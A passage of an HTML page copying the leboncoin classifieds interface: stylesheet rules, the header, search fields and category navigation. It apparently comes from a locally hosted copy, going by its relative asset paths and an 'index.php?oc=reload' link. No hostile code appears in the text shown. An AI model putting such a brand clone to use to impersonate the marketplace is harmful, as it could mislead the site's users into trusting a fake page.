            .styles_container__oa6Q_ {
                bottom: var(--spacing-md);
            }
        }

        @keyframes styles_hide__8Hbb_ {
            0% {
                visibility: visible;
            }

            to {
                visibility: hidden;
            }
        }

        .styles_isHidden__UBlPx {
            animation: styles_hide__8Hbb_ 0.25s forwards;
        }

        .styles_movableLogo__3Am8s {
            transition: opacity var(--embedAnimation) ease-in,
                transform var(--embedAnimation) ease-in-out;
        }

        .styles_movableLogoMovedUp__ibb0A {
            transition: opacity var(--embedAnimation) ease-out var(--shrinkAnimation),
                transform var(--embedAnimation) ease-in-out var(--shrinkAnimation),
                visibility 0ms var(--shrinkEmbedAnimation);
        }

        @keyframes styles_blink__az1Nf {
            0% {
                opacity: 1;
            }

            to {
                opacity: 0;
            }
        }

        .styles_loadingDot__M_5Ri {
            animation: styles_blink__az1Nf 1.5s steps(2, start) infinite;
        }

        .styles_loadingDot__M_5Ri:first-child {
            animation-delay: -0.32s;
        }

        .styles_loadingDot__M_5Ri:nth-child(2) {
            animation-delay: -0.16s;
        }

        .transitions_menuContentOpen___1l0F {
            transition: height var(--layerAnimation),
                padding-bottom var(--layerAnimation);
        }

        .transitions_stickyWrapperIdle__od66m:before {
            transition: height var(--embedAnimation) ease-in-out,
                padding-bottom var(--embedAnimation) ease-in-out;
        }

        .transitions_stickyWrapperEmbedded__tFw6h:before {
            transition: height var(--embedAnimation) ease-in-out,
                padding-bottom var(--embedAnimation) ease-in-out;
            transition-delay: var(--shrinkAnimation);
        }

        .transitions_inputWrapperIdle__Nf8ju {
            transition: top var(--embedAnimation) ease-in-out,
                height var(--embedAnimation) ease-in-out,
                left var(--shrinkAnimation) ease-in-out var(--embedAnimation);
        }

        .transitions_inputWrapperEmbedded__UtlMy {
            transition: left var(--shrinkAnimation) ease-in-out,
                top var(--embedAnimation) ease-in-out var(--shrinkAnimation),
                height var(--embedAnimation) ease-in-out var(--shrinkAnimation);
        }

        .transitions_bottomMarginIdle__sobCN {
            transition: height var(--embedAnimation) ease-in-out,
                padding-bottom var(--embedAnimation) ease-in-out;
        }

        .transitions_bottomMarginEmbedded__QcK06 {
            transition: height var(--embedAnimation) ease-in-out var(--shrinkAnimation),
                padding-bottom var(--embedAnimation) ease-in-out var(--shrinkAnimation);
        }

        .transitions_childrenWrapper__82rie {
            transition: max-width var(--extendAnimation) ease-in-out,
                opacity var(--extendAnimation) ease-in-out;
        }

        .styles_centered__lDvnA {
            text-align: center;
        }

        .styles_navBarOpen___FWY0 {
            padding-bottom: 6.5rem;
        }

        @media (min-width: 971px) {
            .styles_navBarOpen___FWY0 {
                padding-bottom: 0;
            }
        }

        @media print {

            .styles_navBarOpen___FWY0 footer,
            .styles_navBarOpen___FWY0 header {
                display: none;
            }
        }

        .styles_greyBackground__wnePm {
            background-color: #fafafa;
            min-height: 100vh;
        }

        .styles_onboardingBanner__mA3Yf {
            display: flex;
            width: 100%;
            justify-content: center;
            align-items: center;
            border-radius: 4px;
            text-align: center;
            height: 8rem;
            background: url(/_next/static/media/sprite-hands.26784a8a.png) -14rem 0 no-repeat,
                url(/_next/static/media/sprite-hands.26784a8a.png) calc(100% + 17rem) 0 no-repeat;
            background-color: #4183d7;
            cursor: pointer;
        }

        @media (min-width: 768px) {
            .styles_onboardingBanner__mA3Yf {
                background-size: initial;
                height: 13rem;
            }
        }

        .styles_bannerText__R1ws3 {
            display: flex;
            padding: 0.8rem 1.6rem;
            border: 2px solid #fff;
            border-radius: 4px;
            align-items: center;
        }

        @media (min-width: 768px) {
            .styles_bannerText__R1ws3 {
                padding: 2.4rem;
            }
        }
    </style>
    <link rel="stylesheet" type="text/css" href="../../afac57aca238b9b6.css" />

    <link rel="stylesheet" type="text/css" href="../../5466615cd20d05d3.css" />
    <link rel="stylesheet" type="text/css" href="../../45ac04f6673a8dfb.css" />

    <style data-react-tooltip="true">
        .__react_component_tooltip {
            border-radius: 3px;
            display: inline-block;
            font-size: 13px;
            left: -999em;
            opacity: 0;
            padding: 8px 21px;
            position: fixed;
            pointer-events: none;
            transition: opacity 0.3s ease-out;
            top: -999em;
            visibility: hidden;
            z-index: 999;
        }

        .__react_component_tooltip.allow_hover,
        .__react_component_tooltip.allow_click {
            pointer-events: auto;
        }

        .__react_component_tooltip::before,
        .__react_component_tooltip::after {
            content: "";
            width: 0;
            height: 0;
            position: absolute;
        }

        .__react_component_tooltip.show {
            opacity: 0.9;
            margin-top: 0;
            margin-left: 0;
            visibility: visible;
        }

        .__react_component_tooltip.place-top::before {
            border-left: 10px solid transparent;
            border-right: 10px solid transparent;
            bottom: -8px;
            left: 50%;
            margin-left: -10px;
        }

        .__react_component_tooltip.place-bottom::before {
            border-left: 10px solid transparent;
            border-right: 10px solid transparent;
            top: -8px;
            left: 50%;
            margin-left: -10px;
        }

        .__react_component_tooltip.place-left::before {
            border-top: 6px solid transparent;
            border-bottom: 6px solid transparent;
            right: -8px;
            top: 50%;
            margin-top: -5px;
        }

        .__react_component_tooltip.place-right::before {
            border-top: 6px solid transparent;
            border-bottom: 6px solid transparent;
            left: -8px;
            top: 50%;
            margin-top: -5px;
        }

        .__react_component_tooltip .multi-line {
            display: block;
            padding: 2px 0;
            text-align: center;
        }
    </style>

    <style>
        @font-face {
            font-family: "NotoSans_online_security";
            src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/assets/fonts/noto-sans-regular.woff);
        }

        @font-face {
            font-family: "NotoSans_medium_online_security";
            src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/assets/fonts/noto-sans-medium.ttf);
        }

        @font-face {
            font-family: "NotoSans_bold_online_security";
            src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/assets/fonts/noto-sans-bold.woff);
        }

        @font-face {
            font-family: "NotoSans_semibold_online_security";
            src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/assets/fonts/noto-sans-semibold.ttf);
        }
    </style>
</head>

<body data-theme="leboncoinPrivate" cz-shortcut-listen="true">
    <div id="didomi-host" data-nosnippet="true" aria-hidden="true"></div>

    <div id="__next">
        <div
            data-test-id="main-layout-container"
            id="container"
            class=""
            data-pagename="">
            <div data-test-id="advertising-skin-container" class="apn-hb">
                <div>
                    <div
                        aria-label="Encart publicitaire"
                        id="-m"
                        class="teal-apn"
                        data-liberty-position-name=""
                        data-liberty-breakpoint-name="m"></div>
                    <div
                        aria-label="Encart publicitaire"
                        id="-l"
                        class="teal-apn"
                        data-liberty-position-name=""
                        data-liberty-breakpoint-name="l"></div>
                    <div
                        aria-label="Encart publicitaire"
                        id="-xl"
                        class="teal-apn"
                        data-liberty-position-name=""
                        data-liberty-breakpoint-name="xl"></div>
                </div>
            </div>
            <div class="relative flex bg-transparent tiny:bg-background">
                <div class="flex size-full flex-col">
                    <div
                        data-test-id="layout-content"
                        class="flex max-w-full flex-1 flex-col min-h-screen">
                        <div class="">
                            <nav
                                aria-label="Aller au contenu ou au pied de page"
                                class="fixed inset-x-none top-none h-none opacity-0 max-w-page-max rounded-b-md bg-surface shadow z-hide mx-auto my-none p-sm focus-within:z-skip-link focus-within:h-auto focus-within:w-full focus-within:opacity-none">
                                <ul class="flex gap-lg px-md py-sm">
                                    <li>
                                        <a
                                            href="#"
                                            class="flex h-[4.4rem] items-center underline rounded-md px-md py-none font-semi-bold hover:no-underline focus:no-underline">aller au contenu</a>
                                    </li>
                                    <li>
                                        <a
                                            href="#footer"
                                            class="flex h-[4.4rem] items-center underline rounded-md px-md py-none font-semi-bold hover:no-underline focus:no-underline hidden custom:flex">aller au pied de page</a>
                                    </li>
                                </ul>
                            </nav>
                            <div class="h-[1px] mb-[-1px] invisible"></div>
                            <header
                                role="banner"
                                class="border-b-0 border-b-solid visible relative z-sticky border-b-outline transition-colors duration-250 after:fixed after:inset-none after:z-hide after:bg-overlay/dim-3 after:pointer-events-none after:select-none after:opacity-0 after:transition-opacity after:duration-250 border-b-sm">
                                <div
                                    class="pointer-events-none absolute overflow-hidden inset-x-none -bottom-md top-[-1px] before:absolute before:inset-x-none before:bottom-md before:top-none after:absolute after:inset-x-none after:bottom-md after:top-none after:bg-surface"></div>
                                <div
                                    class="relative flex flex-wrap items-center justify-between gap-x-md bg-surface mx-auto my-none max-w-page-max px-lg py-none !max-w-full !p-none">
                                    <div
                                        class="mx-auto my-none w-full max-w-page-max px-lg py-none flex flex-wrap items-center justify-between">
                                        <div class="flex custom:hidden mr-lg">
                                            <nav role="navigation" aria-label="Menu principal">
                                                <button
                                                    class="relative py-sm"
                                                    title="Ouvrir le menu principal"
                                                    aria-expanded="false">
                                                    <svg
                                                        viewBox="0 0 24 24"
                                                        data-title="BurgerMenu"
                                                        fill="currentColor"
                                                        stroke="none"
                                                        class="fill-current text-support w-sz-32 h-sz-32"
                                                        data-spark-component="icon"
                                                        aria-hidden="true"
                                                        focusable="false">
                                                        <path
                                                            fill-rule="evenodd"
                                                            d="m2,5.12c0-.62.45-1.12,1-1.12h18c.55,0,1,.5,1,1.12s-.45,1.12-1,1.12H3c-.55,0-1-.5-1-1.12Zm0,6.88c0-.62.45-1.12,1-1.12h18c.55,0,1,.5,1,1.12s-.45,1.12-1,1.12H3c-.55,0-1-.5-1-1.12Zm0,6.88c0-.62.45-1.12,1-1.12h18c.55,0,1,.5,1,1.12s-.45,1.12-1,1.12H3c-.55,0-1-.5-1-1.12Z"></path>
                                                    </svg>
                                                </button>
                                            </nav>
                                        </div>
                                        <div
                                            class="flex h-[--headerHeight] flex-grow items-center justify-center custom:grow-0 lg:min-w-[181px] lg:justify-start"
                                            style="--headerHeight: 6rem">
                                            <div
                                                class="mr-[calc(3rem+var(--spacing-lg))] overflow-hidden custom:mr-none custom:flex hidden custom:flex">
                                                <div
                                                    class="custom:visible custom:transform-none custom:opacity-none custom:transition-none visible opacity-none styles_movableLogo__3Am8s"
                                                    style="
                              --embedAnimation: 175ms;
                              --shrinkAnimation: 75ms;
                              --shrinkEmbedAnimation: 250ms;
                            ">
                                                    <a
                                                        title="Retour à la page d’accueil"
                                                        class="flex h-[6rem] items-center"
                                                        href="#index.php?oc=reload"><img
                                                            alt="Logo"
                                                            loading="lazy"
                                                            width="181"
                                                            height="30"
                                                            decoding="async"
                                                            data-nimg="1"
                                                            class="h-[3rem] w-[inherit]"
                                                            src="../../img/leboncoin.svg"
                                                            style="color: transparent" /></a>
                                                </div>
                                            </div>
                                            <div class="flex custom:hidden w-full">
                                                <div
                                                    class="border-0 relative flex h-sz-44 w-full items-center rounded-lg bg-neutral-container outline-none pl-3xl pr-lg undefined">
                                                    <div
                                                        class="absolute flex items-center justify-center h-full top-none left-lg">
                                                        <svg
                                                            viewBox="0 0 24 24"
                                                            data-title="Search"
                                                            fill="currentColor"
                                                            stroke="none"
                                                            class="fill-current text-current w-sz-16 h-sz-16"
                                                            data-spark-component="icon"
                                                            aria-hidden="true"
                                                            focusable="false">
                                                            <path
                                                                fill-rule="evenodd"
                                                                d="m10.5,3.95c-3.62,0-6.55,2.93-6.55,6.55s2.93,6.55,6.55,6.55,6.55-2.93,6.55-6.55-2.93-6.55-6.55-6.55ZM2,10.5C2,5.81,5.81,2,10.5,2s8.5,3.81,8.5,8.5-3.81,8.5-8.5,8.5S2,15.2,2,10.5Z"></path>
                                                            <path
                                                                fill-rule="evenodd"
                                                                d="m15.13,15.13c.38-.38,1-.38,1.38,0l5.21,5.21c.38.38.38,1,0,1.38-.38.38-1,.38-1.38,0l-5.21-5.21c-.38-.38-.38-1,0-1.38Z"></path>
                                                        </svg>
                                                    </div>
                                                    <input
                                                        type="text"
                                                        maxlength="500"
                                                        placeholder="Rechercher"
                                                        class="border-0 absolute left-none top-none h-full w-full rounded-[inherit] bg-transparent pl-[inherit] pr-[inherit] text-body-1 text-on-neutral-container placeholder:text-on-neutral-container"
                                                        role="combobox"
                                                        id="4182e13b-ce02-4432-8d73-f56abd9d6326-input"
                                                        autocomplete="off"
                                                        autocapitalize="off"
                                                        enterkeyhint="done"
                                                        aria-autocomplete="list"
                                                        aria-expanded="false"
                                                        aria-haspopup="listbox"
                                                        data-test-id="mobile-input" />
                                                    <div
                                                        role="listbox"
                                                        class="pointer-events-none fixed z-sticky overflow-hidden top-[calc(var(--headerHeight)-1px)] pt-[1px] inset-x-none -bottom-xl"
                                                        style="--headerHeight: 6rem">
                                                        <div
                                                            data-test-id="menu-content"
                                                            class="pointer-events-auto absolute inset-x-none top-none flex flex-col bg-surface px-md pt-none text-body-2 shadow rounded-b-lg rounded-t-none invisible h-none pb-none"
                                                            style="--layerAnimation: 220ms">
                                                            <div
                                                                class="mx-md mt-auto opacity-0"
                                                                style="--layerAnimation: 220ms">
                                                                <button
                                                                    data-spark-component="button"
                                                                    type="button"
                                                                    class="u-shadow-border-transition box-border inline-flex items-center justify-center gap-md whitespace-nowrap px-lg text-body-1 font-bold focus-visible:outline-none focus-visible:u-ring [&amp;:not(:focus-visible)]:ring-inset min-w-sz-44 h-sz-44 rounded-lg bg-main text-on-main hover:bg-main-hovered enabled:active:bg-main-pressed focus-visible:bg-main-focused w-full"
                                                                    aria-busy="false"
                                                                    aria-live="off"
                                                                    aria-label="Rechercher">
                                                                    Rechercher
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div
                                            class="relative z-raised hidden custom:flex mx-lg flex-1">
                                            <div
                                                data-test-id="children"
                                                class="whitespace-nowrap transitions_childrenWrapper__82rie max-w-full opacity-none"
                                                style="--extendAnimation: 350ms; max-width: 234px">
                                                <div class="float-left pr-lg">
                                                    <a
                                                        data-spark-component="button"
                                                        class="u-shadow-border-transition box-border inline-flex items-center justify-center gap-md whitespace-nowrap px-lg text-body-1 font-bold focus-visible:outline-none focus-visible:u-ring [&amp;:not(:focus-visible)]:ring-inset min-w-sz-44 h-sz-44 rounded-lg bg-main text-on-main hover:bg-main-hovered enabled:active:bg-main-pressed focus-visible:bg-main-focused"
                                                        aria-busy="false"
                                                        aria-live="off"
                                                        href="#">
                                                        <svg
                                                            viewBox="0 0 24 24"
                                                            data-title="AddSquareOutline"
                                                            fill="currentColor"
                                                            stroke="none"
                                                            class="fill-current text-current w-sz-16 h-sz-16"
                                                            data-spark-component="icon"
                                                            aria-hidden="true"
                                                            focusable="false">
                                                            <path
                                                                d="m12,6.84c.56,0,1.01.45,1.01,1.01v3.14h3.14c.56.02.99.5.96,1.05-.02.52-.44.94-.96.96h-3.14v3.14c0,.56-.45,1.01-1.01,1.01-.56,0-1.01-.45-1.01-1.01h0v-3.14h-3.14c-.56,0-1.01-.45-1.01-1.01,0-.56.45-1.01,1.01-1.01h3.14v-3.14c0-.56.45-1.01,1.01-1.01h0Z"></path>
                                                            <path
                                                                fill-rule="evenodd"
                                                                d="m7.16,2c-2.85,0-5.16,2.31-5.16,5.16h0v9.68c0,2.85,2.31,5.16,5.16,5.16h9.68c2.85,0,5.16-2.31,5.16-5.16V7.16c0-2.85-2.31-5.16-5.16-5.16H7.16Zm-3.14,5.16c0-1.73,1.4-3.14,3.14-3.14h9.68c1.73,0,3.14,1.4,3.14,3.14h0v9.68c0,1.73-1.4,3.14-3.14,3.14H7.16c-1.73,0-3.14-1.4-3.14-3.14h0V7.16h0Z"></path>
                                                        </svg>
                                                        Déposer une annonce
                                                    </a>
                                                </div>
                                            </div>
                                            <div class="flex-1">
                                                <div
                                                    class="border-0 relative flex h-sz-44 w-full items-center rounded-lg bg-neutral-container outline-none pl-lg pr-[var(--sz-48)] undefined">
                                                    <input
                                                        type="text"
                                                        maxlength="500"
                                                        placeholder="Rechercher"
                                                        class="border-0 absolute left-none top-none h-full w-full rounded-[inherit] bg-transparent pl-[inherit] pr-[inherit] text-body-1 text-on-neutral-container placeholder:text-on-neutral-container"
                                                        role="combobox"
                                                        id="293903ed-b80c-41ca-86c5-4492f59ca5e6-input"
                                                        autocomplete="off"
                                                        autocapitalize="off"
                                                        enterkeyhint="done"
                                                        aria-autocomplete="list"
                                                        aria-expanded="false"
                                                        aria-haspopup="listbox"
                                                        data-test-id="extendable-input" />
                                                    <button
                                                        class="w-2xl h-2xl rounded-[1.2rem] absolute right-md flex items-center justify-center text-on-main bg-main hover:bg-main-hovered"
                                                        title="Rechercher"
                                                        aria-label="Rechercher">
                                                        <svg
                                                            viewBox="0 0 24 24"
                                                            data-title="Search"
                                                            fill="currentColor"
                                                            stroke="none"
                                                            class="fill-current text-current w-sz-16 h-sz-16"
                                                            data-spark-component="icon"
                                                            aria-hidden="true"
                                                            focusable="false">
                                                            <path
                                                                fill-rule="evenodd"
                                                                d="m10.5,3.95c-3.62,0-6.55,2.93-6.55,6.55s2.93,6.55,6.55,6.55,6.55-2.93,6.55-6.55-2.93-6.55-6.55-6.55ZM2,10.5C2,5.81,5.81,2,10.5,2s8.5,3.81,8.5,8.5-3.81,8.5-8.5,8.5S2,15.2,2,10.5Z"></path>
                                                            <path
                                                                fill-rule="evenodd"
                                                                d="m15.13,15.13c.38-.38,1-.38,1.38,0l5.21,5.21c.38.38.38,1,0,1.38-.38.38-1,.38-1.38,0l-5.21-5.21c-.38-.38-.38-1,0-1.38Z"></path>
                                                        </svg>
                                                    </button>
                                                    <div
                                                        role="listbox"
                                                        class="absolute inset-x-none top-[--topPosition]"
                                                        style="--topPosition: 5.2rem">
                                                        <div
                                                            data-test-id="popover-content"
                                                            class="relative overflow-hidden rounded-lg bg-surface shadow max-h-[0]"
                                                            style="--popoverAnimation: 350ms"></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <a
                                            class="group relative flex items-center justify-center self-stretch px-md focus-visible:u-ring-inset flex-col gap-sm hidden custom:flex ml-auto"
                                            aria-label="Mes recherches"
                                            aria-current="false"
                                            href="#">
                                            <div class="relative inline-flex">
                                                <div class="relative h-[2.4rem]">
                                                    <svg
                                                        viewBox="0 0 24 24"
                                                        data-title="AlarmOutline"
                                                        fill="currentColor"
                                                        stroke="none"
                                                        data-test-id="icon"
                                                        class="fill-current text-current w-sz-24 h-sz-24"
                                                        data-spark-component="icon"
                                                        aria-hidden="true"
                                                        focusable="false">
                                                        <path
                                                            fill-rule="evenodd"
                                                            d="m14.1,4.03c1.05.34,2.02.92,2.81,1.72,1.3,1.31,2.03,3.08,2.03,4.93,0,2.8.47,4.35.96,5.25.39.72.58,1.6.26,2.39-.36.88-1.21,1.3-2.15,1.3h-2.94c-.18.69-.58,1.29-1.13,1.72-.56.43-1.24.66-1.95.66s-1.39-.23-1.95-.66c-.56-.43-.96-1.03-1.13-1.72h0s-2.94,0-2.94,0c-.95,0-1.79-.42-2.15-1.3-.32-.79-.13-1.67.26-2.39.49-.9.96-2.44.96-5.25,0-1.85.73-3.62,2.03-4.93.79-.8,1.76-1.38,2.81-1.72.04-1.13.97-2.03,2.1-2.03s2.06.9,2.1,2.03Zm-2.1,1.69c1.31,0,2.56.52,3.48,1.45.92.93,1.44,2.19,1.44,3.5,0,3.02.51,4.93,1.21,6.21.22.41.17.63.16.66h0s-.09.05-.28.05H5.98c-.18,0-.26-.04-.28-.05h0s-.06-.25.16-.66c.7-1.29,1.21-3.2,1.21-6.22,0-1.31.52-2.57,1.44-3.5.92-.93,2.18-1.45,3.48-1.45Z"></path>
                                                    </svg>
                                                </div>
                                                <span
                                                    data-spark-component="badge"
                                                    role="status"
                                                    class="inline-flex h-fit empty:p-none text-center font-bold rounded-full box-content bg-main text-on-main border-surface text-small px-[var(--sz-6)] py-[var(--sz-2)] empty:size-sz-8 absolute right-none border-md translate-x-1/2 -translate-y-1/2 hidden absolute top-md"></span>
                                            </div>
                                            <span class="text-caption">Mes recherches</span>
                                            <div
                                                data-test-id="active-indicator"
                                                class="absolute bottom-none block h-[0.3rem] bg-main transition-all duration-300 ease-out group-hover:w-full group-hover:opacity-none w-none opacity-0"></div>
                                        </a>
                                        <a
                                            class="group relative flex items-center justify-center self-stretch px-md focus-visible:u-ring-inset flex-col gap-sm hidden custom:flex"
                                            aria-label="Favoris"
                                            aria-current="false"
                                            href="#mes-annonces">
                                            <div class="relative h-[2.4rem]">
                                                <svg
                                                    viewBox="0 0 24 24"
                                                    data-title="LikeOutline"
                                                    fill="currentColor"
                                                    stroke="none"
                                                    data-test-id="icon"
                                                    class="fill-current text-current w-sz-24 h-sz-24"
                                                    data-spark-component="icon"
                                                    aria-hidden="true"
                                                    focusable="false">
                                                    <path
                                                        d="m16.28,3c-1.72,0-3.24.83-4.28,2.11-1.04-1.28-2.57-2.11-4.28-2.11-3.21,0-5.72,2.85-5.72,6.24,0,2.77,1.41,4.75,1.97,5.51,1.87,2.47,4.38,4.11,6.67,5.6h.02c.25.17.49.33.73.49.32.21.73.22,1.06.02.21-.13.43-.26.63-.39h.02c2.39-1.48,5.02-3.1,6.95-5.68.64-.86,1.95-2.83,1.95-5.54,0-3.4-2.51-6.23-5.72-6.23h0Zm-8.57,2.12c1.46,0,2.76.96,3.35,2.39.16.38.52.64.93.64s.77-.25.93-.64c.6-1.44,1.9-2.39,3.36-2.39,1.99,0,3.7,1.79,3.69,4.13,0,2-.98,3.5-1.52,4.24-1.67,2.25-3.98,3.67-6.43,5.19l-.07.04-.21-.13c-2.33-1.52-4.54-2.97-6.18-5.14-.51-.67-1.54-2.18-1.54-4.2,0-2.33,1.7-4.13,3.7-4.13h0Z"></path>
                                                </svg>
                                            </div>
                                            <span class="text-caption">Favoris</span>
                                            <div
                                                data-test-id="active-indicator"
                                                class="absolute bottom-none block h-[0.3rem] bg-main transition-all duration-300 ease-out group-hover:w-full group-hover:opacity-none w-none opacity-0"></div>
                                        </a>
                                        <a
                                            class="group relative flex items-center justify-center self-stretch px-md focus-visible:u-ring-inset flex-col gap-sm hidden custom:flex"
                                            aria-label="Messages"
                                            aria-current="page"
                                            href="#messages">
                                            <div class="relative inline-flex">
                                                <div class="relative h-[2.4rem]">
                                                    <svg
                                                        viewBox="0 0 24 24"
                                                        data-title="MessageOutline"
                                                        fill="currentColor"
                                                        stroke="none"
                                                        data-test-id="icon"
                                                        class="fill-current text-current w-sz-24 h-sz-24"
                                                        data-spark-component="icon"
                                                        aria-hidden="true"
                                                        focusable="false">
                                                        <path
                                                            fill-rule="evenodd"
                                                            d="m2,6.18c0-2.34,1.9-4.18,4.21-4.18h11.5c2.36,0,4.28,1.92,4.28,4.28v14.7c0,.38-.22.74-.56.91-.34.17-.75.14-1.06-.09l-3.66-2.74H6.3c-2.35,0-4.27-1.9-4.28-4.26-.01-2.52-.02-6.03-.01-8.63Zm4.21-2.15c-1.22,0-2.18.96-2.18,2.15,0,2.6,0,6.09.01,8.62,0,1.24,1.01,2.23,2.25,2.23h10.75c.22,0,.43.07.61.2l2.31,1.73V6.28c0-1.24-1.01-2.25-2.25-2.25H6.22Zm10.68,4.17H7.1c-.56,0-1.02-.45-1.02-1.02,0-.56.45-1.02,1.02-1.02h9.8c.56,0,1.02.45,1.02,1.02s-.45,1.02-1.02,1.02Zm0,3.19H7.1c-.56,0-1.02-.45-1.02-1.02,0-.56.45-1.02,1.02-1.02h9.8c.56,0,1.02.45,1.02,1.02s-.45,1.02-1.02,1.02Zm-10.82,2.25c0-.56.45-1.02,1.02-1.02h6.53c.56,0,1.02.45,1.02,1.02s-.45,1.02-1.02,1.02h-6.53c-.56,0-1.02-.45-1.02-1.02Z"></path>
                                                    </svg>
                                                </div>
                                                <span
                                                    data-spark-component="badge"
                                                    role="status"
                                                    class="inline-flex h-fit empty:p-none text-center font-bold rounded-full box-content bg-main text-on-main border-surface text-small px-[var(--sz-6)] py-[var(--sz-2)] empty:size-sz-8 absolute right-none border-md translate-x-1/2 -translate-y-1/2 hidden absolute top-md"></span>
                                            </div>
                                            <span class="text-caption">Messages</span>
                                            <div
                                                data-test-id="active-indicator"
                                                class="absolute bottom-none block h-[0.3rem] bg-main transition-all duration-300 ease-out group-hover:w-full group-hover:opacity-none w-full opacity-none"></div>
                                        </a>

                                        <div class="z-base flex-1 basis-full">
                                            <div
                                                class="group/nav relative hidden h-[--navHeight] custom:flex"
                                                data-test-id="sticky-bar"
                                                style="--navHeight: 5rem">
                                                <div
                                                    class="relative after:absolute after:inset-x-none after:bottom-none after:z-raised after:scale-x-0 after:border-b-md after:border-outline-high group-hover/nav:after:scale-x-0 hover:after:!scale-x-100 hover:after:transition-all font-regular">
                                                    <button
                                                        class="relative inline-flex h-full flex-col items-center justify-center bg-surface align-middle text-body-2 text-on-surface text-on-surface before:pointer-events-none before:invisible before:h-none before:select-none before:overflow-hidden before:font-bold before:content-[attr(data-label)] pl-none pr-md"
                                                        data-label="Immobilier">
                                                        Immobilier
                                                    </button>
                                                </div>
                                                <span
                                                    class="relative z-hide flex-1 bg-surface text-on-surface before:text-bold before:pointer-events-none before:absolute before:left-1/2 before:top-1/2 before:-translate-x-1/2 before:-translate-y-1/2 before:select-none before:content-['·'] last:hidden"></span>
                                                <div
                                                    class="relative after:absolute after:inset-x-none after:bottom-none after:z-raised after:scale-x-0 after:border-b-md after:border-outline-high group-hover/nav:after:scale-x-0 hover:after:!scale-x-100 hover:after:transition-all font-regular">
                                                    <button
                                                        class="relative inline-flex h-full flex-col items-center justify-center bg-surface align-middle text-body-2 text-on-surface text-on-surface before:pointer-events-none before:invisible before:h-none before:select-none before:overflow-hidden before:font-bold before:content-[attr(data-label)] pl-md pr-md"
                                                        data-label="Véhicules">
                                                        Véhicules
                                                    </button>
                                                </div>
                                                <span
                                                    class="relative z-hide flex-1 bg-surface text-on-surface before:text-bold before:pointer-events-none before:absolute before:left-1/2 before:top-1/2 before:-translate-x-1/2 before:-translate-y-1/2 before:select-none before:content-['·'] last:hidden"></span>
                                                <div
                                                    class="relative after:absolute after:inset-x-none after:bottom-none after:z-raised after:scale-x-0 after:border-b-md after:border-outline-high group-hover/nav:after:scale-x-0 hover:after:!scale-x-100 hover:after:transition-all font-regular">
                                                    <button
                                                        class="relative inline-flex h-full flex-col items-center justify-center bg-surface align-middle text-body-2 text-on-surface text-on-surface before:pointer-events-none before:invisible before:h-none before:select-none before:overflow-hidden before:font-bold before:content-[attr(data-label)] pl-md pr-md"
                                                        data-label="Locations de vacances">
                                                        Locations de vacances
                                                    </button>
                                                </div>
                                                <span
                                                    class="relative z-hide flex-1 bg-surface text-on-surface before:text-bold before:pointer-events-none before:absolute before:left-1/2 before:top-1/2 before:-translate-x-1/2 before:-translate-y-1/2 before:select-none before:content-['·'] last:hidden"></span>
                                                <div
                                                    class="relative after:absolute after:inset-x-none after:bottom-none after:z-raised after:scale-x-0 after:border-b-md after:border-outline-high group-hover/nav:after:scale-x-0 hover:after:!scale-x-100 hover:after:transition-all font-regular">
                                                    <button
                                                        class="relative inline-flex h-full flex-col items-center justify-center bg-surface align-middle text-body-2 text-on-surface text-on-surface before:pointer-events-none before:invisible before:h-none before:select-none before:overflow-hidden before:font-bold before:content-[attr(data-label)] pl-md pr-md"
                                                        data-label="Emploi">
                                                        Emploi
                                                    </button>
                                                </div>
                                                <span
                                                    class="relative z-hide flex-1 bg-surface text-on-surface before:text-bold before:pointer-events-none before:absolute before:left-1/2 before:top-1/2 before:-translate-x-1/2 before:-translate-y-1/2 before:select-none before:content-['·'] last:hidden"></span>
                                                <div
                                                    class="relative after:absolute after:inset-x-none after:bottom-none after:z-raised after:scale-x-0 after:border-b-md after:border-outline-high group-hover/nav:after:scale-x-0 hover:after:!scale-x-100 hover:after:transition-all font-regular">
                                                    <button
                                                        class="relative inline-flex h-full flex-col items-center justify-center bg-surface align-middle text-body-2 text-on-surface text-on-surface before:pointer-events-none before:invisible before:h-none before:select-none before:overflow-hidden before:font-bold before:content-[attr(data-label)] pl-md pr-md"
                                                        data-label="Mode">
                                                        Mode
                                                    </button>
                                                </div>
                                                <span
                                                    class="relative z-hide flex-1 bg-surface text-on-surface before:text-bold before:pointer-events-none before:absolute before:left-1/2 before:top-1/2 before:-translate-x-1/2 before:-translate-y-1/2 before:select-none before:content-['·'] last:hidden"></span>
                                                <div
                                                    class="relative after:absolute after:inset-x-none after:bottom-none after:z-raised after:scale-x-0 after:border-b-md after:border-outline-high group-hover/nav:after:scale-x-0 hover:after:!scale-x-100 hover:after:transition-all font-regular">
                                                    <button
                                                        class="relative inline-flex h-full flex-col items-center justify-center bg-surface align-middle text-body-2 text-on-surface text-on-surface before:pointer-events-none before:invisible before:h-none before:select-none before:overflow-hidden before:font-bold before:content-[attr(data-label)] pl-md pr-md"
                                                        data-label="Maison &amp; Jardin">
                                                        Maison &amp; Jardin
                                                    </button>
                                                </div>
                                                <span
                                                    class="relative z-hide flex-1 bg-surface text-on-surface before:text-bold before:pointer-events-none before:absolute before:left-1/2 before:top-1/2 before:-translate-x-1/2 before:-translate-y-1/2 before:select-none before:content-['·'] last:hidden"></span>
                                                <div
                                                    class="relative after:absolute after:inset-x-none after:bottom-none after:z-raised after:scale-x-0 after:border-b-md after:border-outline-high group-hover/nav:after:scale-x-0 hover:after:!scale-x-100 hover:after:transition-all font-regular">
                                                    <button
                                                        class="relative inline-flex h-full flex-col items-center justify-center bg-surface align-middle text-body-2 text-on-surface text-on-surface before:pointer-events-none before:invisible before:h-none before:select-none before:overflow-hidden before:font-bold before:content-[attr(data-label)] pl-md pr-md"
                                                        data-label="Famille">
                                                        Famille
                                                    </button>
                                                </div>
                                                <span
                                                    class="relative z-hide flex-1 bg-surface text-on-surface before:text-bold before:pointer-events-none before:absolute before:left-1/2 before:top-1/2 before:-translate-x-1/2 before:-translate-y-1/2 before:select-none before:content-['·'] last:hidden"></span>
                                                <div
                                                    class="relative after:absolute after:inset-x-none after:bottom-none after:z-raised after:scale-x-0 after:border-b-md after:border-outline-high group-hover/nav:after:scale-x-0 hover:after:!scale-x-100 hover:after:transition-all font-regular">
                                                    <button
